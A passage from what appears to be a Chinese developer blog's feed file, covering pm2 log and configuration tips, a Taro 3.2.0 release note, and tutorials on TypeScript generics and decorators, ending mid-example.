<h4 id="6、日志问题"><a href="#6、日志问题" class="headerlink" title="6、日志问题"></a>6、日志问题</h4><p>日志系统对于任意应用而言，通常都是必不可少的一个辅助功能。pm2的相关文件默认存放于$HOME/.pm2/目录下，其日志主要有两类：</p>
<p><a href="https://camo.githubusercontent.com/7b9ac5eb511f8f93e60ed37bd9dbfeb03d43c63d/687474703a2f2f7777312e73696e61696d672e636e2f6c617267652f61653439626135376779316664703067317a356a626a32316b32303673713564"><img src="http://upload-images.jianshu.io/upload_images/10024246-999dcbf8be916146?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p>a. pm2自身的日志，存放于$HOME/.pm2/pm2.log；</p>
<p>b. pm2所管理的应用的日志，存放于$HOME/.pm2/logs/目录下，标准谁出日志存放于${APP_NAME}_out.log，标准错误日志存放于${APP_NAME}_error.log；</p>
<p>这里之所以把日志单独说明一下是因为，如果程序开发不严谨，为了调试程序，导致应用产生大量标准输出，使服务器本身记录大量的日志，导致服务磁盘满载问题。一般而言，pm2管理的应用本身都有自己日志系统，所以对于这种不必要的输出内容需禁用日志，重定向到/dev/null。</p>
<p>与crontab比较，也有类似情况，crontab自身日志，与其管理的应用本身的输出。应用脚本输出一定需要重定向到/dev/null，因为该输出内容会以邮件的形式发送给用户，内容存储在邮件文件，会产生意向不到的结果，或会导致脚本压根不被执行；</p>
<h4 id="7、高级用法"><a href="#7、高级用法" class="headerlink" title="7、高级用法"></a>7、高级用法</h4><p>pm2支持配置文件启动：<br>pm2 ecosystem： 生成配置文件ecosystem.json<br>pm2 startOrRestart /file/path/ecosystem.json : 通过配置文件启动服务</p>
<p>如下是开发时ecosystem.json的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x2F;**</span><br><span class="line">    * Application configuration section</span><br><span class="line">    * http:&#x2F;&#x2F;pm2.keymetrics.io&#x2F;docs&#x2F;usage&#x2F;application-declaration&#x2F;</span><br><span class="line">    * 多个服务，依次放到apps对应的数组里</span><br><span class="line">    *&#x2F;</span><br><span class="line">    apps : [</span><br><span class="line">    &#x2F;&#x2F; First application</span><br><span class="line">        &#123;</span><br><span class="line">            name      : &quot;nova&quot;,</span><br><span class="line">            max_memory_restart: &quot;300M&quot;,</span><br><span class="line">            script    : &quot;&#x2F;root&#x2F;nova&#x2F;app.js&quot;,</span><br><span class="line">            out_file : &quot;&#x2F;logs&#x2F;nova_out.log&quot;,</span><br><span class="line">            error_file : &quot;&#x2F;logs&#x2F;nova_error.log&quot;,</span><br><span class="line">            instances  : 4,</span><br><span class="line">            exec_mode  : &quot;cluster&quot;,</span><br><span class="line">            env: &#123;</span><br><span class="line">                NODE_ENV: &quot;production&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上述采用cluster模式启动了4个服务进程；如果服务占用的内存超过300M，会自动进行重启。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 配置项</span><br><span class="line"></span><br><span class="line">name  应用进程名称；</span><br><span class="line"></span><br><span class="line">script  启动脚本路径；</span><br><span class="line"></span><br><span class="line">cwd  应用启动的路径，关于script与cwd的区别举例说明：在&#x2F;home&#x2F;polo&#x2F;目录下运行&#x2F;data&#x2F;release&#x2F;node&#x2F;</span><br><span class="line">index.js，此处script为&#x2F;data&#x2F;release&#x2F;node&#x2F;index.js，cwd为&#x2F;home&#x2F;polo&#x2F;；</span><br><span class="line"></span><br><span class="line">args  传递给脚本的参数；</span><br><span class="line"></span><br><span class="line">interpreter  指定的脚本解释器；</span><br><span class="line"></span><br><span class="line">interpreter_args  传递给解释器的参数；</span><br><span class="line"></span><br><span class="line">instances  应用启动实例个数，仅在cluster模式有效，默认为fork；</span><br><span class="line"></span><br><span class="line">exec_mode  应用启动模式，支持fork和cluster模式；</span><br><span class="line"></span><br><span class="line">watch  监听重启，启用情况下，文件夹或子文件夹下变化应用自动重启；</span><br><span class="line"></span><br><span class="line">ignore_watch  忽略监听的文件夹，支持正则表达式；</span><br><span class="line"></span><br><span class="line">max_memory_restart  最大内存限制数，超出自动重启；</span><br><span class="line"></span><br><span class="line">env  环境变量，object类型，如&#123;&quot;NODE_ENV&quot;:&quot;production&quot;, &quot;ID&quot;: &quot;42&quot;&#125;；</span><br><span class="line"></span><br><span class="line">log_date_format  指定日志日期格式，如YYYY-MM-DD HH:mm:ss；</span><br><span class="line"></span><br><span class="line">error_file  记录标准错误流，$HOME&#x2F;.pm2&#x2F;logs&#x2F;XXXerr.log)，代码错误可在此文件查找；</span><br><span class="line"></span><br><span class="line">out_file  记录标准输出流，$HOME&#x2F;.pm2&#x2F;logs&#x2F;XXXout.log)，如应用打印大量的标准输出，会导致pm2日志过大；</span><br><span class="line"></span><br><span class="line">min_uptime  应用运行少于时间被认为是异常启动；</span><br><span class="line"></span><br><span class="line">max_restarts  最大异常重启次数，即小于min_uptime运行时间重启次数；</span><br><span class="line"></span><br><span class="line">autorestart  默认为true, 发生异常的情况下自动重启；</span><br><span class="line"></span><br><span class="line">cron_restart  crontab时间格式重启应用，目前只支持cluster模式；</span><br><span class="line"></span><br><span class="line">force  默认false，如果true，可以重复启动一个脚本。pm2不建议这么做；</span><br><span class="line"></span><br><span class="line">restart_delay  异常重启情况下，延时重启时间；</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="8、稳定运行建议"><a href="#8、稳定运行建议" class="headerlink" title="8、稳定运行建议"></a>8、稳定运行建议</h4><p>PM2是一款非常优秀的Node进程管理工具，它有着丰富的特性：能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。</p>
<p>个人几点看法保证常驻应用进程稳定运行：</p>
<ol>
<li><p> 定时重启，应用进程运行时间久了或许总会产生一些意料之外的问题，定时可以规避一些不可测的情况；</p>
</li>
<li><p> 最大内存限制，根据观察设定合理内存限制，保证应用异常运行；</p>
</li>
<li><p> 合理min_uptime，min_uptime是应用正常启动的最小持续运行时长，超出此时间则被判定为异常启动；</p>
</li>
<li><p> 设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题；</p>
</li>
<li><p> 设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。</p>
</li>
</ol>
<p>关于pm2的使用，主要还是运用于常驻脚本。</p>
<h4 id="9、自动化部署"><a href="#9、自动化部署" class="headerlink" title="9、自动化部署"></a>9、自动化部署</h4><p>通过shell脚本实现资源拉取、服务重启、nginx缓存更新等操作，再配合pm2的监控功能，就初步达到了一个后端工程部署的标配了。</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="http://pm2.keymetrics.io/">1.pm2官网</a><br><a href="https://github.com/Unitech/pm2">2.pm2 github</a></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Taro 3.2.0 正式版发布，支持 React Native</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Taro%203.2.0%20%E6%AD%A3%E5%BC%8F%E7%89%88%E5%8F%91%E5%B8%83%EF%BC%8C%E6%94%AF%E6%8C%81%20React%20Native/</url>
    <content><![CDATA[<p>Taro 是一个开放式跨端跨框架解决方案，支持使用 React/Vue/Nerv 等框架来开发微信/京东/百度/支付宝/字节跳动/ QQ 小程序/H5 等应用，现已发布 3.2.0 正式版，主要更新内容如下：</p>
<ul>
<li>简化编译过程，大大提升了 React Native 编译速度</li>
<li>source-map 支持</li>
<li>多 React Native 版本支持，拥抱最新版 0.64</li>
<li>更丰富API与组件</li>
<li>API与组件按需引入</li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>TypeScript泛型的基本使用和理解</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/TypeScript%E6%B3%9B%E5%9E%8B%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>许多时候，标注的具体类型并不能确定，比如一个函数的参数类型</p>
<p>在像C#和Java这样的语言中，可以使用<code>泛型</code>来创建可重用的组件，一个组件可以支持多种类型的数据。 这样用户就可以以自己的数据类型来使用组件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getVal(obj, k) &#123;    return obj[k];&#125;</span><br></pre></td></tr></table></figure>

<p>上面的函数，我们想实现的是获取一个对象指定的 k 所对应的值</p>
<p>那么实际使用的时候，obj 的类型是 不确定的 自然 k 的取值范围也是不确定的</p>
<p>它需要我们在具体调用的时候才能确定</p>
<p>这个时候这种定义过程不确定类型的需求就可以通过泛型来解决</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getVal&lt;T&gt;(obj: T, k: keyof T) &#123;    return obj[k];&#125;</span><br></pre></td></tr></table></figure>
<p>所谓的泛型，就是给可变(不定)的类型定义变量(参数)， &lt;&gt; 类似 ()</p>
<h3 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h3><p>在面向对象章节中，我们曾经给大家讲过一个基于泛型使用的例子:模拟组件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abstract class Component&lt;T1, T2&gt; &#123;</span><br><span class="line">    props: T1;</span><br><span class="line">		state: T2;</span><br><span class="line">    constructor(props: T1) &#123; </span><br><span class="line">        this.props &#x3D; props;</span><br><span class="line">    &#125;</span><br><span class="line">   	abstract render(): string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMyComponentProps &#123;</span><br><span class="line">    val: number;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IMyComponentState &#123;</span><br><span class="line">		x: number; </span><br><span class="line">&#125;</span><br><span class="line">class MyComponent extends Component&lt;IMyComponentProps, IMyComponentState&gt; &#123;</span><br><span class="line">    constructor(props: IMyComponentProps) &#123;</span><br><span class="line">        super(props);</span><br><span class="line">				this.state &#x3D; &#123; </span><br><span class="line">						x: 1</span><br><span class="line">				&#125; </span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">    render() &#123; </span><br><span class="line">        this.props.val;</span><br><span class="line">        this.state.x;</span><br><span class="line">        return &#39;&lt;myComponent &#x2F;&gt;&#39;;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line">let myComponent &#x3D; new MyComponent(&#123;val: 1&#125;); </span><br><span class="line">myComponent.render();</span><br></pre></td></tr></table></figure>

<h3 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h3><p>我们还可以在接口中使用泛型 后端提供了一些接口 用以返回一些数据</p>
<p>依据返回的数据格式定义如下接口:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface IResponseData &#123;</span><br><span class="line">    code: number;</span><br><span class="line">    message?: string;</span><br><span class="line">		data: any; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据接口，我们封装对应的一些方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData(url: string) &#123; </span><br><span class="line">	return fetch(url).then(res &#x3D;&gt; &#123;</span><br><span class="line">		return res.json();</span><br><span class="line">	&#125;).then( (data: IResponseData) &#x3D;&gt; &#123;</span><br><span class="line">        return data;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是，我们会发现该接口的 data 项的具体格式不确定，不同的接口会返回的数据是不一样的，当我们 想根据具体当前请求的接口返回具体 data 格式的时候，就比较麻烦了，因为 getData 并不清楚你调 用的具体接口是什么，对应的数据又会是什么样的</p>
<p>这个时候我们可以对 IResponseData 使用泛型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface IResponseData&lt;T&gt; &#123;</span><br><span class="line">    code: number;</span><br><span class="line">    message?: string;</span><br><span class="line">		data: T; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData&lt;U&gt;(url: string) &#123; </span><br><span class="line">	return fetch(url).then(res &#x3D;&gt; &#123;</span><br><span class="line">  			return res.json();</span><br><span class="line">  &#125;).then( (data: IResponseData&lt;U&gt;) &#x3D;&gt; &#123;</span><br><span class="line">       return data;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义不同的数据接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 用户接口</span><br><span class="line">interface IResponseUserData &#123;</span><br><span class="line">    id: number;</span><br><span class="line">    username: string;</span><br><span class="line">    email: string;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 文章接口</span><br><span class="line">interface IResponseArticleData &#123;</span><br><span class="line">    id: number;</span><br><span class="line">    title: string;</span><br><span class="line">    author: IResponseUserData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用具体代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~(async function()&#123;</span><br><span class="line">    let user &#x3D; await getData&lt;IResponseUserData&gt;(&#39;&#39;); </span><br><span class="line">    if (user.code &#x3D;&#x3D;&#x3D; 1) &#123;</span><br><span class="line">    		console.log(user.message); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    		console.log(user.data.username); </span><br><span class="line">    &#125;</span><br><span class="line">    let articles &#x3D; await getData&lt;IResponseArticleData&gt;(&#39;&#39;); </span><br><span class="line">    if (articles.code &#x3D;&#x3D;&#x3D; 1) &#123;</span><br><span class="line">        console.log(articles.message); </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(articles.data.id);</span><br><span class="line">        console.log(articles.data.author.username); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>TypeScript装饰器（decorators）</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/TypeScript%E8%A3%85%E9%A5%B0%E5%99%A8%EF%BC%88decorators%EF%BC%89/</url>
    <content><![CDATA[<h2 id="什么是装饰器"><a href="#什么是装饰器" class="headerlink" title="什么是装饰器"></a>什么是装饰器</h2><p>装饰器是一种特殊类型的声明，它能够被附加到类声明，方法， 访问符，属性或参数上。  装饰器使用 @expression这种形式，expression求值后必须为一个函数，它会在运行时被调用，被装饰的声明信息做为参数传入。</p>
<p>通俗的理解可以认为就是在原有代码外层包装了一层处理逻辑。<br>个人认为装饰器是一种解决方案，而并非是狭义的***@Decorator***，后者仅仅是一个语法糖罢了。</p>
<p>装饰器在身边的例子随处可见，一个简单的例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">水龙头上边的起泡器就是一个装饰器，在装上以后就会把空气混入水流中，掺杂很多泡泡在水里。</span><br><span class="line">但是起泡器安装与否对水龙头本身并没有什么影响，即使拆掉起泡器，也会照样工作，水龙头的作用在于阀门的控制，至于水中掺不掺杂气泡则不是水龙头需要关心的。</span><br></pre></td></tr></table></figure>

<p>在TypeScript中装饰器还属于实验性语法，你必须在命令行或<code>tsconfig.json</code>里启用<code>experimentalDecorators</code>编译器选项：</p>
<p>命令行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tsc --target ES5 --experimentalDecorators</span><br></pre></td></tr></table></figure>

<p>tsconfig.json:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;compilerOptions&quot;: &#123;</span><br><span class="line">        &quot;target&quot;: &quot;ES5&quot;,</span><br><span class="line">        &quot;experimentalDecorators&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="为什么要用装饰器"><a href="#为什么要用装饰器" class="headerlink" title="为什么要用装饰器"></a>为什么要用装饰器</h3><p>可能有些时候，我们会对传入参数的类型判断、对返回值的排序、过滤，对函数添加节流、防抖或其他的功能性代码，基于多个类的继承，各种各样的与函数逻辑本身无关的、重复性的代码。<br>所以，对于装饰器，可以简单地理解为是非侵入式的行为修改。</p>
<h3 id="如何定义装饰器"><a href="#如何定义装饰器" class="headerlink" title="如何定义装饰器"></a>如何定义装饰器</h3><p>装饰器本身其实就是一个函数，理论上忽略参数的话，任何函数都可以当做装饰器使用。<br>helloword.ts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function helloWord(target: any) &#123;</span><br><span class="line">    console.log(&#39;hello Word!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@helloWord</span><br><span class="line">class HelloWordClass &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>tsc</code>编译后,执行命令<code>node helloword.js</code>，输出结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello Word!</span><br></pre></td></tr></table></figure>

<p>装饰器组合<br>多个装饰器可以同时应用到一个声明上，就像下面的示例：</p>
<p>书写在同一行上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@f @g x</span><br></pre></td></tr></table></figure>
<p>书写在多行上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@f</span><br><span class="line">@g</span><br><span class="line">x</span><br></pre></td></tr></table></figure>

<h3 id="装饰器执行时机"><a href="#装饰器执行时机" class="headerlink" title="装饰器执行时机"></a>装饰器执行时机</h3><p>修饰器对类的行为的改变，是代码编译时发生的（不是TypeScript编译，而是js在执行机中编译阶段），而不是在运行时。这意味着，修饰器能在编译阶段运行代码。也就是说，修饰器本质就是编译时执行的函数。<br>在Node.js环境中模块一加载时就会执行</p>
<p>但是实际场景中，有时希望向装饰器传入一些参数, 如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@Path(&quot;&#x2F;hello&quot;, &quot;world&quot;)</span><br><span class="line">class HelloService &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>此时上面装饰器方法就不满足了（VSCode编译报错），这是我们可以借助<em><strong>JavaScript中函数柯里化特性</strong></em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Path(p1: string, p2: string) &#123;</span><br><span class="line">    return function (target) &#123; &#x2F;&#x2F;  这才是真正装饰器</span><br><span class="line">        &#x2F;&#x2F; do something </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="装饰器类型"><a href="#装饰器类型" class="headerlink" title="装饰器类型"></a>装饰器类型</h3><p>装饰器的类型有：类装饰器、访问器装饰器、属性装饰器、方法装饰器、参数装饰器，但是没有函数装饰器(function)。</p>
<h4 id="1-类装饰器"><a href="#1-类装饰器" class="headerlink" title="1.类装饰器"></a>1.类装饰器</h4><p>应用于类构造函数，其参数是类的构造函数。<br><em><strong>注意class并不是像Java那种强类型语言中的类，而是JavaScript构造函数的语法糖。</strong></em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addAge(args: number) &#123;</span><br><span class="line">    return function (target: Function) &#123;</span><br><span class="line">        target.prototype.age &#x3D; args;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@addAge(18)</span><br><span class="line">class Hello &#123;</span><br><span class="line">    name: string;</span><br><span class="line">    age: number;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        console.log(&#39;hello&#39;);</span><br><span class="line">        this.name &#x3D; &#39;yugo&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(Hello.prototype.age);&#x2F;&#x2F;18</span><br><span class="line">let hello &#x3D; new Hello();</span><br><span class="line"></span><br><span class="line">console.log(hello.age);&#x2F;&#x2F;18</span><br></pre></td></tr></table></figure>
<h4 id="2-方法装饰器"><a href="#2-方法装饰器" class="headerlink" title="2.方法装饰器"></a>2.方法装饰器</h4><p>它会被应用到方法的 属性描述符上，可以用来监视，修改或者替换方法定义。<br>方法装饰会在运行时传入下列3个参数：</p>
<ul>
<li>1、对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>2、成员的名字。</li>
<li>3、成员的属性描述符{value: any, writable: boolean, enumerable: boolean, configurable: boolean}。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function addAge(constructor: Function) &#123;</span><br><span class="line">  constructor.prototype.age &#x3D; 18;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function method(target: any, propertyKey: string, descriptor: PropertyDescriptor) &#123;</span><br><span class="line">   console.log(target);</span><br><span class="line">   console.log(&quot;prop &quot; + propertyKey);</span><br><span class="line">   console.log(&quot;desc &quot; + JSON.stringify(descriptor) + &quot;\n\n&quot;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">@addAge</span><br><span class="line">class Hello&#123;</span><br><span class="line">  name: string;</span><br><span class="line">  age: number;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    console.log(&#39;hello&#39;);</span><br><span class="line">    this.name &#x3D; &#39;yugo&#39;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @method</span><br><span class="line">  hello()&#123;</span><br><span class="line">    return &#39;instance method&#39;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @method</span><br><span class="line">  static shello()&#123;</span><br><span class="line">    return &#39;static method&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们得到的结果是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello &#123; hello: [Function] &#125;</span><br><span class="line">prop hello</span><br><span class="line">desc &#123;&quot;writable&quot;:true,&quot;enumerable&quot;:true,&quot;configurable&quot;:true&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123; [Function: Hello] shello: [Function] &#125;</span><br><span class="line">prop shello</span><br><span class="line">desc &#123;&quot;writable&quot;:true,&quot;enumerable&quot;:true,&quot;configurable&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>假如我们修饰的是 hello 这个实例方法，第一个参数将是原型对象，也就是 Hello.prototype。</p>
<p>假如是 shello 这个静态方法，则第一个参数是构造器 constructor。</p>
<p>第二个参数分别是属性名，第三个参数是属性修饰对象。</p>
<p><strong>注意：</strong>在vscode编辑时有时会报作为表达式调用时，无法解析方法修饰器的签名。错误，此时需要在<code>tsconfig.json</code>中增加<code>target</code>配置项：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;compilerOptions&quot;: &#123;</span><br><span class="line">        &quot;target&quot;: &quot;es6&quot;,</span><br><span class="line">        &quot;experimentalDecorators&quot;: true,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-访问器装饰器"><a href="#3-访问器装饰器" class="headerlink" title="3. 访问器装饰器"></a>3. 访问器装饰器</h4><p>访问器装饰器应用于访问器的属性描述符，可用于观察，修改或替换访问者的定义。 访问器装饰器不能在声明文件中使用，也不能在任何其他环境上下文中使用（例如在声明类中）。</p>
<blockquote>
<p>注意: TypeScript不允许为单个成员装饰get和set访问器。相反，该成员的所有装饰器必须应用于按文档顺序指定的第一个访问器。这是因为装饰器适用于属性描述符，它结合了get和set访问器，而不是单独的每个声明。</p>
</blockquote>
<p>访问器装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ul>
<li>对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>成员的名字。</li>
<li>成员的属性描述符。<blockquote>
<p>注意  如果代码输出目标版本小于ES5，Property Descriptor将会是undefined。</p>
</blockquote>
</li>
</ul>
<p>如果访问器装饰器返回一个值，它会被用作方法的<em>属性描述符</em>。</p>
<blockquote>
<p>注意  如果代码输出目标版本小于<code>ES5</code>返回值会被忽略。</p>
</blockquote>
<p>下面是使用了访问器装饰器（<code>@configurable</code>）的例子，应用于<code>Point</code>类的成员上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> class Point &#123;</span><br><span class="line">    private _x: number;</span><br><span class="line">    private _y: number;</span><br><span class="line">    constructor(x: number, y: number) &#123;</span><br><span class="line">        this._x &#x3D; x;</span><br><span class="line">        this._y &#x3D; y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @configurable(false)</span><br><span class="line">    get x() &#123; return this._x; &#125;</span><br><span class="line"></span><br><span class="line">    @configurable(false)</span><br><span class="line">    get y() &#123; return this._y; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过如下函数声明来定义<code>@configurable</code>装饰器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function configurable(value: boolean) &#123;</span><br><span class="line">    return function (target: any, propertyKey: string, descriptor: PropertyDescriptor) &#123;</span><br><span class="line">        descriptor.configurable &#x3D; value;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="4-方法参数装饰器"><a href="#4-方法参数装饰器" class="headerlink" title="4. 方法参数装饰器"></a>4. 方法参数装饰器</h4><p>参数装饰器表达式会在运行时当作函数被调用，传入下列3个参数：</p>
<ul>
<li>1、对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>2、参数的名字。</li>
<li>3、参数在函数参数列表中的索引。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const parseConf &#x3D; [];</span><br><span class="line">class Modal &#123;</span><br><span class="line">    @parseFunc</span><br><span class="line">    public addOne(@parse(&#39;number&#39;) num) &#123;</span><br><span class="line">        console.log(&#39;num:&#39;, num);</span><br><span class="line">        return num + 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在函数调用前执行格式化操作</span><br><span class="line">function parseFunc(target, name, descriptor) &#123;</span><br><span class="line">    const originalMethod &#x3D; descriptor.value;</span><br><span class="line">    descriptor.value &#x3D; function (...args: any[]) &#123;</span><br><span class="line">        for (let index &#x3D; 0; index &lt; parseConf.length; index++) &#123;</span><br><span class="line">            const type &#x3D; parseConf[index];</span><br><span class="line">            console.log(type);</span><br><span class="line">            switch (type) &#123;</span><br><span class="line">                case &#39;number&#39;:</span><br><span class="line">                    args[index] &#x3D; Number(args[index]);</span><br><span class="line">                    break;</span><br><span class="line">                case &#39;string&#39;:</span><br><span class="line">                    args[index] &#x3D; String(args[index]);</span><br><span class="line">                    break;</span><br><span class="line">                case &#39;boolean&#39;:</span><br><span class="line">                    args[index] &#x3D; String(args[index]) &#x3D;&#x3D;&#x3D; &#39;true&#39;;</span><br><span class="line">                    break;</span><br><span class="line">            &#125;</span><br><span class="line">            return originalMethod.apply(this, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    return descriptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 向全局对象中添加对应的格式化信息</span><br><span class="line">function parse(type) &#123;</span><br><span class="line">    return function (target, name, index) &#123;</span><br><span class="line">        parseConf[index] &#x3D; type;</span><br><span class="line">        console.log(&#39;parseConf[index]:&#39;, type);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">let modal &#x3D; new Modal();</span><br><span class="line">console.log(modal.addOne(&#39;10&#39;)); &#x2F;&#x2F; 11</span><br></pre></td></tr></table></figure>

<h4 id="5-属性装饰器"><a href="#5-属性装饰器" class="headerlink" title="5. 属性装饰器"></a>5. 属性装饰器</h4><p>属性装饰器表达式会在运行时当作函数被调用，传入下列2个参数：</p>
<ul>
<li>1、对于静态成员来说是类的构造函数，对于实例成员是类的原型对象。</li>
<li>2、成员的名字。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function log(target: any, propertyKey: string) &#123;</span><br><span class="line">    let value &#x3D; target[propertyKey];</span><br><span class="line">    &#x2F;&#x2F; 用来替换的getter</span><br><span class="line">    const getter &#x3D; function () &#123;</span><br><span class="line">        console.log(&#96;Getter for $&#123;propertyKey&#125; returned $&#123;value&#125;&#96;);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 用来替换的setter</span><br><span class="line">    const setter &#x3D; function (newVal) &#123;</span><br><span class="line">        console.log(&#96;Set $&#123;propertyKey&#125; to $&#123;newVal&#125;&#96;);</span><br><span class="line">        value &#x3D; newVal;</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F; 替换属性，先删除原先的属性，再重新定义属性</span><br><span class="line">    if (delete this[propertyKey]) &#123;</span><br><span class="line">        Object.defineProperty(target, propertyKey, &#123;</span><br><span class="line">            get: getter,</span><br><span class="line">            set: setter,</span><br><span class="line">            enumerable: true,</span><br><span class="line">            configurable: true</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Calculator &#123;</span><br><span class="line">    @log</span><br><span class="line">    public num: number;</span><br><span class="line">    square() &#123;</span><br><span class="line">        return this.num * this.num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let cal &#x3D; new Calculator();</span><br><span class="line">cal.num &#x3D; 2;</span><br><span class="line">console.log(cal.square());</span><br><span class="line">&#x2F;&#x2F; Set num to 2</span><br><span class="line">&#x2F;&#x2F; Getter for num returned 2</span><br><span 